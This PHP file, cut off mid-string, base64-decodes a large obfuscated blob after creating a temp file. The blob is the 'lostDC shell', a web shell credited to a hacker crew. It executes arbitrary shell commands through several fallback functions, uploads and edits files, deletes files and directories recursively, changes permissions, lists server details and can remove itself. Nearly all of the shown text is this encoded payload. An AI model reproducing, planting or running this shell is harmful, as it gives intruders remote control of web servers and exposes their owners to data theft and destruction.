<?php
$tmp=tempnam('/tmp','FOO');
$c=base64_decode('P'.'z4gPD9waHAKCi8qICoKICogCiAqIGxvc3REQyBzaGVsbAogKiBQSFAgU2hlbGwgc2NyaXR0YSBkYSBsb3N0cGFzc3dvcmQsIEQzdmlsYzBkZSBjcmV3CiAqIFJpbGFzY2lhdGEgc290dG8gbGljZW56YSBHUEwgMjAwOS8yMDEwCiAqIERhdGEgcmlsYXNjaW86IDI1LzEyLzIwMDkgKGVoIHNpLCBpbCBnaW9ybm8gZGkgbmF0YWxlIG5vbiBhdmV2byBuaWVudGUgZGEgZmFyZSkKICogTGEgU2hlbGwgcHJlc2VudGEgdmFyaWUgZnVuemlvbmksIG1hIHJpbWFuZSBjb211bnF1ZSBpbiBjb250aW51byBhZ2dpb3JuYW1lbnRvCiAqIAogKiAqLwoKaWYgKCFmdW5jdGlvbl9leGlzdHMoImdldFRpbWUiKSkgewogICAgZnVuY3Rpb24gZ2V0VGltZSgpIHsKICAgICAgICBsaXN0KCR1c2VjLCAkc2VjKSA9IGV4cGxvZGUoIiAiLCBtaWNyb3RpbWUoKSk7CiAgICAgICAgcmV0dXJuICgoZmxvYXQpJHVzZWMgKyAoZmxvYXQpJHNlYyk7CiAgICAgfQp9CmRlZmluZSgic3RhcnRUaW1lIixnZXRUaW1lKCkpOwoKaWYgKCFmdW5jdGlvbl9leGlzdHMoInNoZWxsZXhlYyIpKSB7CiAgICBmdW5jdGlvbiBzaGVsbGV4ZWMoJGNtZCkgewogICAgICAgICBnbG9iYWwgJGRpc2FibGVmdW5jOwogICAgICAgICAkcmVzdWx0ID0gIiI7CiAgICAgICAgIGlmICghZW1wdHkoJGNtZCkpIHsKICAgICAgICAgICAgICBpZiAoaXNfY2FsbGFibGUoImV4ZWMiKSBhbmQgIWluX2FycmF5KCJleGVjIiwkZGlzYWJsZWZ1bmMpKSB7CiAgICAgICAgICAgICAgICAgIGV4ZWMoJGNtZCwkcmVzdWx0KTsgCiAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSBqb2luKCJcbiIsJHJlc3VsdCk7CiAgICAgICAgICAgICAgfSBlbHNlaWYgKCgkcmVzdWx0ID0gYCRjbWRgKSAhPT0gRkFMU0UpIHt9CiAgICAgICAgICAgICAgZWxzZWlmIChpc19jYWxsYWJsZSgic3lzdGVtIikgYW5kICFpbl9hcnJheSgic3lzdGVtIiwkZGlzYWJsZWZ1bmMpKSB7CiAgICAgICAgICAgICAgICAgICR2ID0gb2JfZ2V0X2NvbnRlbnRzKCk7IAogICAgICAgICAgICAgICAgICBvYl9jbGVhbigpOyAKICAgICAgICAgICAgICAgICAgc3lzdGVtKCRjbWQpOyAKICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9IG9iX2dldF9jb250ZW50cygpOyAKICAgICAgICAgICAgICAgICAgb2JfY2xlYW4oKTsgCiAgICAgICAgICAgICAgICAgIGVjaG8gJHY7CiAgICAgICAgICAgICAgfSBlbHNlaWYgKGlzX3Jlc291cmNlKCRmcCA9IHBvcGVuKCRjbWQsInIiKSkpIHsKICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAiIjsKICAgICAgICAgICAgICAgICAgIHdoaWxlKCFmZW9mKCRmcCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0IC49IGZyZWFkKCRmcCwxMDI0KTsKICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgIHBjbG9zZSgkZnApOwogICAgICAgICAgICAgIH0KICAgICAgICAgfQogICAgICAgICByZXR1cm4gJHJlc3VsdDsKICAgIH0KfQoKZnVuY3Rpb24gZ2V0cGVybXMgKCRmaWxlKSB7ICAgICAgICAKICAgICRwZXJtID0gc3Vic3RyKHNwcmludGYoJyVvJywgZmlsZXBlcm1zKCRmaWxlKSksIC00KTsKICAgIHJldHVybiAkcGVybTsKfQoKaWYgKCFmdW5jdGlvbl9leGlzdHMoInZpZXdfc2l6ZSIpKSB7CiAgICBmdW5jdGlvbiB2aWV3X3NpemUoJHNpemUpewogICAgICAgICBpZiAoIWlzX251bWVyaWMoJHNpemUpKSB7CiAgICAgICAgICAgICByZXR1cm4gRkFMU0U7CiAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgaWYgKCRzaXplID49IDEwNzM3NDE4MjQpIHsKICAgICAgICAgICAgICAgICAgLyogQ29udmVyc2lvbmUgZGEgQnl0ZSBhIEdpZ2FCeXRlICovCiAgICAgICAgICAgICAgICAgICRzaXplID0gcm91bmQoJHNpemUvMTA3Mzc0MTgyNCoxMDApLzEwMCAuIiBHQiI7CiAgICAgICAgICAgICAgfSBlbHNlaWYgKCRzaXplID49IDEwNDg1NzYpIHsKICAgICAgICAgICAgICAgICAgLyogQ29udmVyc2lvbmUgZGEgQnl0ZSBhIE1lZ2FCeXRlICovCiAgICAgICAgICAgICAgICAgICRzaXplID0gcm91bmQoJHNpemUvMTA0ODU3NioxMDApLzEwMCAuIiBNQiI7CiAgICAgICAgICAgICAgfSBlbHNlaWYgKCRzaXplID49IDEwMjQpIHsKICAgICAgICAgICAgICAgICAgLyogQ29udmVyc2lvbmUgZGEgQnl0ZSBhIEtpbG9CeXRlICovCiAgICAgICAgICAgICAgICAgICRzaXplID0gcm91bmQoJHNpemUvMTAyNCoxMDApLzEwMCAuIiBLQiI7CiAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgLyogQnl0ZSAqLwogICAgICAgICAgICAgICAgICAkc2l6ZSA9ICRzaXplIC4gIiBCIjsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgcmV0dXJuICRzaXplOwogICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIGdldGluZm8oKQp7CiAgICAkaW5mbyAgPSAnJzsKICAgICRpbmZvIC49ICdbfl1WZXJzaW9uZSBQSFA6ICcgLnBocHZlcnNpb24oKSAuJzxiciAvPic7CiAgICAkaW5mbyAuPSAnW35dU2VydmVyOiAnIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10gLic8YnIgLz4nOwogICAgJGluZm8gLj0gJ1t+XUluZGlyaXp6byBJUDogJyAuJF9TRVJWRVJbJ1NFUlZFUl9BRERSJ10gLic8YnIgLz4nOwogICAgJGluZm8gLj0gJ1t+XVNvZnR3YXJlOiAnIC4kX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ10uJzxiciAvPic7CiAgICAkaW5mbyAuPSAnW35dQ2hhcnNldDogJyAuJF9TRVJWRVJbJ0hUVFBfQUNDRVBUX0NIQVJTRVQnXSAuICc8YnIgLz4nOwogICAgJGluZm8gLj0gKChpbmlfZ2V0KCdzYWZlX21vZGUnKSA9PSAwKSA/ICdbfl1TYWZlIE1vZGU6IDxmb250IGNvbG9yPSIjMDBGRjMzIj5PRkY8L2ZvbnQ+PGJyIC8+JyAgICA6ICdbfl1TYWZlIE1vZGU6IDxmb250IGNvbG9yPSIjRkYzMzAwIj5PRkY8L2ZvbnQ+PGJyIC8+Jyk7CiAgICAkaW5mbyAuPSAoKGluaV9nZXQoJ21hZ2ljX3F1b3Rlc19ncGMnKSA9PSAwKSA/ICdbfl1NYWdpYyBRdW90ZXM6IDxmb250IGNvbG9yPSIjMDBGRjMzIj5PRkY8L2ZvbnQ+PGJyIC8+JyA6ICdbfl1NYWdpYyBRdW90ZXM6IDxmb250IGNvbG9yPSIjRkYzMzAwIj5PTjwvZm9udD48YnIgLz4nKTsKICAgIGlmIChpc19jYWxsYWJsZSgiZGlza19mcmVlX3NwYWNlIikpIHsKICAgICAgICAkZCA9IHJlYWxwYXRoKCIuIik7CiAgICAgICAgICRmcmVlID0gZGlza19mcmVlX3NwYWNlKCRkKTsKICAgICAgICAgJHRvdGFsID0gZGlza190b3RhbF9zcGFjZSgkZCk7CiAgICAgICAgIGlmICgkZnJlZSA9PT0gRkFMU0UgfHwgJGZyZWUgPCAwKSB7CiAgICAgICAgICAgICAkZnJlZSA9IDA7CiAgICAgICAgIH0KICAgICAgICAgaWYgKCR0b3RhbCA9PT0gRkFMU0UgfHwgJHRvdGFsIDwgMCkgewogICAgICAgICAgICAgJHRvdGFsID0gMDsKICAgICAgICAgfQogICAgICAgICAkdXNlZCA9ICR0b3RhbC0kZnJlZTsKICAgICAgICAgJGluZm8gLj0gIlt+XUZyZWUgc3BhY2U6ICIudmlld19zaXplKCRmcmVlKS4iLyIudmlld19zaXplKCR0b3RhbCkuIjxiciAvPiI7CiAgICB9CiAgICByZXR1cm4gJGluZm87Cn0KIAppZiAoIWlzc2V0ICgkX0dFVCBbJ2RpciddKSl7CiAgICAkZGlyID0gZ2V0Y3dkICgpOwp9CmVsc2UgewogICAgJGRpciA9ICRfR0VUIFsnZGlyJ107Cn0KY2hkaXIgKCRkaXIpOwogCiRjdXJyZW50ID0gZ2V0Y3dkICgpOwokYyA9ICI/ZGlyPSIgLiAkY3VycmVudDsKCiRob21lID0gIjxodG1sPgogICAgPGhlYWQ+CiAgICAgICAgPHRpdGxlPmxvc3REQyAtICIuJGN1cnJlbnQuIjwvdGl0bGU+CiAgICAgICAgPHN0eWxlIHR5cGU9XCJ0ZXh0L2Nzc1wiPgogICAgICAgIGJvZHkgewogICAgICAgICAgICBjb2xvcjogI0ZGRkZGRjsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBDb3VyaWVyIE5ldywgVmVyZGFuYSwgQXJpYWw7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTFweDsKICAgICAgICAgICAgY3Vyc29yOiBjcm9zc2hhaXI7CiAgICAgICAgfQogICAgICAgIGE6bGluayB7CiAgICAgICAgICAgIGNvbG9yOiAjRkZGRkZGOwogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgICAgfQogICAgICAgIGE6dmlzaXRlZCB7CiAgICAgICAgICAgIGNvbG9yOiAjRkZGRkZGOwogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgICAgfQogICAgICAgIGE6aG92ZXIgewogICAgICAgICAgICBjdXJzb3I6IGNyb3NzaGFpcjsKICAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgICAgICAgY29sb3I6ICM4MDgwODA7CiAgICAgICAgfQogICAgICAgIGEuaGVhZCB7CiAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgICAgICAgdGV4dC1jb2xvcjogI0ZGMDAwMDsKICAgICAgICB9CiAgICAgICAgYS5oZWFkOmhvdmVyIHsKICAgICAgICAgICAgY3Vyc29yOiBjcm9zc2hhaXI7CiAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgICAgICAgY29sb3I6ICNGRjAwMDA7CiAgICAgICAgfQogICAgICAgIHRhYmxlIHsKICAgICAgICAgICAgZm9udC1zaXplOiAxMXB4OwogICAgICAgIH0KICAgICAgICB0ZC5saXN0IHsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgd2hpdGU7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTFweDsKICAgICAgICB9CiAgICAgICAgdGQubGlzdDpob3ZlciB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMyMjI7CiAgICAgICAgfQogICAgICAgICNpbmZvIHsKICAgICAgICAgICAgZm9udC1zaXplOiAgICAgICAgICAgIDEycHg7CiAgICAgICAgICAgIHdpZHRoOiAgICAgICAgICAgICAgICA1MCU7CiAgICAgICAgICAgIG1hcmdpbi1sZWZ0OiAgICAgICAgMjAlOwogICAgICAgICAgICB0ZXh0LWFsaWduOiBsZWZ0OwogICAgICAgIH0KICAgICAgICAjZm9vdCB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogICAgICAgICAgICAxMnB4OwogICAgICAgICAgICB3aWR0aDogICAgICAgICAgICAgICAgNjUlOwogICAgICAgICAgICBtYXJnaW4tbGVmdDogICAgICAgIDIwJTsKICAgICAgICAgICAgdGV4dC1hbGlnbjogbGVmdDsKICAgICAgICB9CiAgICAgICAgaW5wdXQ6aG92ZXIsIHRleHRhcmVhOmhvdmVyIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogIzgwODA4MDsKICAgICAgICAgICAgY3Vyc29yOiBjcm9zc2hhaXI7CiAgICAgICAgfQogICAgICAgICNwZXJtIHsKICAgICAgICAgICAgY29sb3I6ICNGRjAwMDA7CiAgICAgICAgfQoKICAgIDwvc3R5bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4iOwoKcHJpbnQgJGhvbWUuIjxjZW50ZXI+PGEgaHJlZiA9IFwiIi4kX1NFUlZFUlsnUEhQX1NFTEYnXS4iXCI+PGltZyBzcmMgPSBcImh0dHA6Ly9pbWczNjcuaW1hZ2VzaGFjay51cy9pbWczNjcvOTgzNC9iYW5uZXJkYzJieWd1LnBuZ1wiIGJvcmRlciA9IFwibm9uZVwiPjwvYT48L2NlbnRlcj4iOwpwcmludCAiPGhyIHNpemU9XCIxXCIgd2lkdGg9XCI2MCVcIiBub3NoYWRlIC8+XG48ZGl2IGlkID0gXCJpbmZvXCI+W35dRGlyZWN0b3J5IGNvcnJlbnRlOiAiIC4gZ2V0Y3dkICgpIC4gIjxiciAvPiIuZ2V0aW5mbygpLiI8L2Rpdj5cbjxociBzaXplPVwiMVwiIHdpZHRoPVwiNjAlXCIgbm9zaGFkZSAvPiI7CiAKcHJpbnQgIjx0YWJsZSB3aWR0aCA9IDYwJSBoZWlnaHQgPSAxMCUgYWxpZ24gPSBcImNlbnRlclwiPlxuIjsKcHJpbnQgIjx0cj5cbiI7CnByaW50ICI8dGQ+WyA8YSBjbGFzcyA9IFwiaGVhZFwiIGhyZWYgPSAnIiAuICRjIC4gIiZtb2RlPWNyZWF0ZSc+TmV3PC9hPiBdPC90ZD5cbiI7CnByaW50ICI8dGQ+WyA8YSBjbGFzcyA9IFwiaGVhZFwiIGhyZWYgPSAnIiAuICRjIC4gIiZtb2RlPXBocGluZm8nPlBIUCBJbmZvPC9hPiBdPC90ZD5cbiI7CnByaW50ICI8dGQ+WyA8YSBjbGFzcyA9IFwiaGVhZFwiIGhyZWYgPSAnIiAuICRjIC4gIiZtb2RlPW5vcGFzdGUmYWN0aW9uPWlucyc+Tm8tUGFzdGU8L2E+IF08L3RkPlxuIjsKcHJpbnQgIjx0ZD5bIDxhIGNsYXNzID0gXCJoZWFkXCIgaHJlZiA9ICciIC4gJGMgLiAiJm1vZGU9ZXhlY3V0ZSc+U2hlbGwgQ29tbWFuZDwvYT4gXTwvdGQ+XG4iOwpwcmludCAiPHRkPlsgPGEgY2xhc3MgPSBcImhlYWRcIiBocmVmID0gJyIgLiAkYyAuICImbW9kZT1oYXNoZXInPkhhc2hlcjwvYT4gXTwvdGQ+XG4iOwpwcmludCAiPHRkPlsgPGEgY2xhc3MgPSBcImhlYWRcIiBocmVmID0gJyIgLiRjIC4gIiZtb2RlPXNlbGZyZW1vdmUnPlNlbGYgUmVtb3ZlPC9hPiBdPC90ZD5cbiI7CnByaW50ICI8L3RyPjwvdGFibGU+PGNlbnRlcj4iOwogCiRtb2RlID0gJF9HRVQgWydtb2RlJ107CnN3aXRjaCAoJG1vZGUpIHsKICAgIGNhc2UgImVkaXQiOgogICAgICAgICRmaWxlID0gJF9HRVQgWydmaWxlJ107CiAgICAgICAgJG5ldyA9ICRfUE9TVCBbJ25ldyddOwogICAgICAgIGlmIChlbXB0eSAoJG5ldykpIHsKICAgICAgICAgICAgJGZwID0gZm9wZW4gKCRmaWxlICwgInIiKTsKICAgICAgICAgICAgJGNvbnQgPSBmcmVhZCAoJGZwLCBmaWxlc2l6ZSAoJGZpbGUpKTsKICAgICAgICAgICAgJGNvbnQgPSBzdHJfcmVwbGFjZSAoIjx0ZXh0YXJlYT4iICwgIjx0ZXh0YXJlYT4iICwgJGNvbnQpOwogICAgICAgICAgICBwcmludCAiPGZvcm0gYWN0aW9uID0gJyIgLiAkYyAuICImbW9kZT1lZGl0JmZpbGU9IiAuICRmaWxlIC4gIicgbWV0aG9kID0gJ1BPU1QnPlxuIjsKICAgICAgICAgICAgcHJpbnQgIkZpbGU6ICIuICRmaWxlIC4gIjxiciAvPlxuIjsKICAgICAgICAgICAgcHJpbnQgIjx0ZXh0YXJlYSBuYW1lID0gJ25ldycgcm93cyA9ICcyNScgY29scyA9ICcxMDAnPiIgLiAkY29udCAuICI8L3RleHRhcmVhPjxiciAvPlxuIjsKICAgICAgICAgICAgcHJpbnQgIjxpbnB1dCB0eXBlID0gJ3N1Ym1pdCcgdmFsdWUgPSAnRWRpdCc+PC9mb3JtPlxuIjsKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRmcCA9IGZvcGVuICgkZmlsZSAsICJ3Iik7CiAgICAgICAgICAgIGlmIChmd3JpdGUgKCRmcCAsICRuZXcpKSB7CiAgICAgICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiBodHRwOi8vJy4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJF9TRVJWRVJbJ1BIUF9TRUxGJ10uJz9kaXI9Jy4kZGlyKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIHByaW50ICJJbXBvc3NpYmlsZSBlZGl0YXJlICIgLiAkZmlsZSAuICI8YnIgLz5cbiI7CiAgICAgICAgICAgICAgICBlY2hvICI8YSBocmVmPVwiamF2YXNjcmlwdDpoaXN0b3J5LmdvKC0xKVwiPkluZGlldHJvPC9hPjxiciAvPjxiciAvPlxuIjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmY2xvc2UgKCRmcCk7CiAgICAgICAgYnJlYWs7CiAgICBjYXNlICJ1cGxvYWQiOgogICAgICAgICR0ZW1wID0gJF9GSUxFUyBbJ2ZpbGUnXSBbJ3RtcF9uYW1lJ107CiAgICAgICAgJGZpbGUgPSBiYXNlbmFtZSAoJF9GSUxFUyBbJ2ZpbGUnXSBbJ25hbWUnXSk7CiAgICAgICAgaWYgKCFlbXB0eSAoJGZpbGUpKSB7CiAgICAgICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlICgkdGVtcCAsICRmaWxlKSkgewogICAgICAgICAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogaHR0cDovLycuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydQSFBfU0VMRiddLic/ZGlyPScuJGRpcik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBwcmludCAiSW1wb3NzaWJpbGUgY2FyaWNhcmUgIiAuICRmaWxlIC4gIlxuIjsKICAgICAgICAgICAgICAgIGVjaG8gIjxhIGhyZWY9XCJqYXZhc2NyaXB0Omhpc3RvcnkuZ28oLTEpXCI+SW5kaWV0cm88L2E+PGJyIC8+PGJyIC8+XG4iOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgY2FzZSAiZG93bmxvYWQiOgogICAgICAgICRmaWxlbmFtZSA9ICRfR0VUWydmaWxlbmFtZSddOwogICAgICAgIGhlYWRlcigiUHJhZ21hOiBuby1jYWNoZSIpOwogICAgICAgIGhlYWRlcigiRXhwaXJlczogMCIpOwogICAgICAgIGhlYWRlciAoICJDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSIgKTsKICAgICAgICBoZWFkZXIgKCAiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Ii4kZmlsZW5hbWUuIjsiICk7CiAgICAgICAgaGVhZGVyICggIkNvbnRlbnQtRGVzY3JpcHRpb246IERvd25sb2FkIG1hbmFnZXIiICk7CiAgICAgICAgaGVhZGVyICggIkNvbnRlbnQtTGVuZ3RoOiAiIC4gZmlsZXNpemUgKCRmaWxlbmFtZSkgKTsKICAgICAgICByZWFkZmlsZSAoJGZpbGVuYW1lKTsKICAgICAgICBicmVhazsKICAgIGNhc2UgInJlbmFtZSI6CiAgICAgICAgJG9sZCA9ICRfR0VUIFsnb2xkJ107CiAgICAgICAgcHJpbnQgIjxmb3JtIGFjdGlvbiA9ICciLiAkYyAuICImbW9kZT1yZW5hbWUmb2xkPSIgLiAkb2xkIC4gIicgbWV0aG9kID0gJ1BPU1QnPlxuIjsKICAgICAgICBwcmludCAiTmV3IG5hbWU6IDxpbnB1dCBuYW1lID0gJ25ldyc+PGJyIC8+XG4iOwogICAgICAgIHByaW50ICI8aW5wdXQgdHlwZSA9ICdzdWJtaXQnIHZhbHVlID0gJ1JlbmFtZSc+PC9mb3JtPlxuIjsKICAgICAgICAkbmV3ID0gJF9QT1NUIFsnbmV3J107CiAgICAgICAgaWYgKCFlbXB0eSAoJG5ldykpIHsKICAgICAgICAgICAgaWYgKHJlbmFtZSAoJG9sZCAsICRuZXcpKSB7CiAgICAgICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiBodHRwOi8vJy4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJF9TRVJWRVJbJ1BIUF9TRUxGJ10uJz9kaXI9Jy4kZGlyKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIHByaW50ICJJbXBvc3NpYmlsZSByaW5vbWluYXJlICIgLiAkb2xkIC4gIi48cD5cbiI7CiAgICAgICAgICAgICAgICBlY2hvICI8YSBocmVmPVwiamF2YXNjcmlwdDpoaXN0b3J5LmdvKC0xKVwiPkluZGlldHJvPC9hPjxiciAvPjxiciAvPlxuIjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBicmVhazsKICAgIGNhc2UgImNobW9kIjoKICAgICAgICBpZiAoY2htb2QoJF9QT1NUWyd0b21vZCddLCBpbnR2YWwoJF9QT1NUWydtb2QnXSwgOCkpID09IGZhbHNlKSB7CiAgICAgICAgICAgIHByaW50ICJJbXBvc3NpYmlsZSBjYW1iaWFyZSBpIHBlcm1lc3NpIGEgIiAuJF9QT1NUWyd0b21vZCddIC4gIjxiciAvPiI7CiAgICAgICAgICAgIGVjaG8gIjxhIGhyZWY9XCJqYXZhc2NyaXB0Omhpc3RvcnkuZ28oLTEpXCI+SW5kaWV0cm88L2E+PGJyIC8+PGJyIC8+XG4iOwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogaHR0cDovLycuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydQSFBfU0VMRiddLic/ZGlyPScuJGRpcik7CiAgICAgICAgICAgIC8vIHByaW50ICIiLiRfUE9TVFsndG9tb2QnXS4iIGNvbiBwZXJtZXNzaTogIi5pbnR2YWwoJF9QT1NUWydtb2QnXSwgOCkuIiBlJyBzdGF0byBjaG1vZGRhdG9cbiI7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgY2FzZSAicmVtb3ZlIjoKICAgICAgICAkZmlsZSA9ICRfR0VUIFsnZmlsZSddOwogICAgICAgIGlmICh1bmxpbmsgKCRmaWxlKSkgewogICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiBodHRwOi8vJy4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJF9TRVJWRVJbJ1BIUF9TRUxGJ10uJz9kaXI9Jy4kZGlyKTsKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIHByaW50ICJJbXBvc3NpYmlsZSByaW11b3ZlcmUgIiAuICRmaWxlIC4gIiA8YnIgLz5cbiI7CiAgICAgICAgICAgIGVjaG8gIjxhIGhyZWY9XCJqYXZhc2NyaXB0Omhpc3RvcnkuZ28oLTEpXCI+SW5kaWV0cm88L2E+PGJyIC8+PGJyIC8+XG4iOwogICAgICAgIH0KICAgICAgICBicmVhazsKICAgIGNhc2UgInNlbGZyZW1vdmUiOgogICAgICAgIGhlYWRlcignTG9jYXRpb246IGh0dHA6Ly8nLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4kX1NFUlZFUlsnUEhQX1NFTEYnXS4nP2Rpcj0nLiRkaXIuJyZtb2RlPXJlbW92ZSZmaWxlPScuX19GSUxFX18pOwogICAgICAgIGJyZWFrOwogICAgY2FzZSAibWFrZWRpciI6CiAgICAgICAgaWYgKG1rZGlyKCRfUE9TVFsnZGlyJ10sIDA3NzcpID09IGZhbHNlKSB7CiAgICAgICAgICAgIHByaW50ICJJbXBvc3NpYmlsZSBjcmVhcmUgZGlyZWN0b3J5OyAiIC4kX1BPU1RbJ2RpciddIC4gIiA8YnIgLz5cbiI7CiAgICAgICAgICAgIGVjaG8gIjxhIGhyZWY9XCJqYXZhc2NyaXB0Omhpc3RvcnkuZ28oLTEpXCI+SW5kaWV0cm88L2E+PGJyIC8+PGJyIC8+XG4iOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGhlYWRlcignTG9jYXRpb246IGh0dHA6Ly8nLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4kX1NFUlZFUlsnUEhQX1NFTEYnXSk7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgY2FzZSAiZ29kaXIiOgogICAgICAgICRnb3RvID0gJF9QT1NUWydnb3RvJ107CiAgICAgICAgaWYgKGlzc2V0KCRfUE9TVFsnZ290byddKSkgewogICAgICAgICAgICBjaGRpcigkZ290byk7CiAgICAgICAgICAgIGhlYWRlcignTG9jYXRpb246IGh0dHA6Ly8nLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4kX1NFUlZFUlsnUEhQX1NFTEYnXS4kYy4nLycuJGdvdG8pOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGhlYWRlcignTG9jYXRpb246IGh0dHA6Ly8nLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4kX1NFUlZFUlsnUEhQX1NFTEYnXSk7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgY2FzZSAiZWxpbWluYSI6CiAgICAgICAgJGRpcmUgPSAkX0dFVFsnZGlyZSddOwogICAgICAgIGlmICgkaGFuZGxlID0gb3BlbmRpcigkZGlyZSkpIHsKICAgICAgICAgICAgJGFycmF5ID0gYXJyYXkoKTsKICAgICAgICAgICAgd2hpbGUgKGZhbHNlICE9ICgkZmlsZSA9IHJlYWRkaXIoJGhhbmRsZSkpKSB7CiAgICAgICAgICAgICAgICBpZiAoJGZpbGUgIT0gIi4iICYmICRmaWxlICE9ICIuLiIpIHsKICAgICAgICAgICAgICAgICAgICBpZihpc19kaXIoJGRpcmUuJGZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCFybWRpcigkZGlyZS4kZmlsZSkpIHsgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWxldGVfZGlyZWN0b3J5KCRkaXJlLiRmaWxlLicvJyk7IAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICB1bmxpbmsoJGRpcmUuJGZpbGUpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjbG9zZWRpcigkaGFuZGxlKTsKICAgICAgICAgICAgcm1kaXIoJGRpcmUpOwogICAgICAgIH0KICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiBodHRwOi8vJy4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJF9TRVJWRVJbJ1BIUF9TRUxGJ10uJz9kaXI9Jy4kZGlyKTsKICAgICAgICBicmVhazsKICAgIGNhc2UgImNyZWF0ZSI6CiAgICAgICAgJG5ldyA9ICRfUE9TVCBbJ25ldyddOwogICAgICAgIGlmIChpc3NldCgkX1BPU1RbJ25ldyddKSkgewogICAgICAgICAgICBpZiAoIWVtcHR5ICgkbmV3KSkgewogICAgICAgICAgICAgICAgaWYgKCRmcCA9IGZvcGVuICgkbmV3LCAidyIpKXsKICAgICAgICAgICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiBodHRwOi8vJy4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJF9TRVJWRVJbJ1BIUF9TRUxGJ10uJz9kaXI9Jy4kZGlyKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIHByaW50ICJJbXBvc3NpYmlsZSBjcmVhcmUgIiAuICRmaWxlIC4gIi48cD5cbiI7CiAgICAgICAgICAgICAgICAgICAgZWNobyAiPGEgaHJlZj1cImphdmFzY3JpcHQ6aGlzdG9yeS5nbygtMSlcIj5JbmRpZXRybzwvYT48L2NlbnRlcj48YnIgLz48YnIgLz5cbiI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBmY2xvc2UgKCRmcCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIHByaW50ICI8Zm9ybSBhY3Rpb24gPSAnIiAuICRjIC4gIiZtb2RlPWNyZWF0ZScgbWV0aG9kID0gJ1BPU1QnPlxuIjsKICAgICAgICAgICAgcHJpbnQgIjx0cj48dGQ+TmV3IGZpbGU6IDxpbnB1dCBuYW1lID0gJ25ldyc+PC90ZD5cbiI7CiAgICAgICAgICAgIHByaW50ICI8dGQ+PGlucHV0IHR5cGUgPSAnc3VibWl0JyB2YWx1ZSA9ICdDcmVhdGUnPjwvdGQ+PC90cj48L2Zvcm0+XG4iOwogICAgICAgIH0KICAgICAgIC